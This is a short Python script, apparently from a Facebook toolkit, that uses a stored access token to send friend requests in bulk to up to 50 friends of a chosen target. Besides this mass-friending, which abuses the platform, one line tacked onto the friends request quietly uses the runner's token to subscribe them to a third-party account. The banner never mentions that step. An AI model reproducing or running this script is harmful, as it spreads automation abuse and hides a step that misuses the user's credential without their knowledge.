#!usr/bin/python3.7
#Author: AHMAD SIDIK
#Github: https://github.com/Sidik28KrW/mbf
try:
	import requests,json,sys,os,time
	os.system('clear')
	print("""
\t[ Auto add friends from friends id ]
\t        [ by : AHMAD SIDIK ]
""")
	toket=open('toket/token.txt','r').read()
	fid=input('[!] your target id: ')
	print()
	if fid == '':
		exit("[?] are you stupid")
	rq=requests.get('https://graph.facebook.com/'+fid+'?fields=friends.limit(50)&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
	js=json.loads(rq.text)

	id=[]
	for i in js['friends']['data']:
		id.append(i['id'])
		req = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['id'],toket))
#		print(req.text)
		if 'true' in req.text:
			print("[+] %s (%s) [success]"%(i['name'],i['id']))
		else: print("[-] %s (%s) [failed]"%(i['name'],i['id']))
		if len(id) == 50:
			break
		print("[!] delay 10 second")
		time.sleep(10)
	print("[^•^] done.")
except Exception as F:
	print("[Err] %s"%(F))
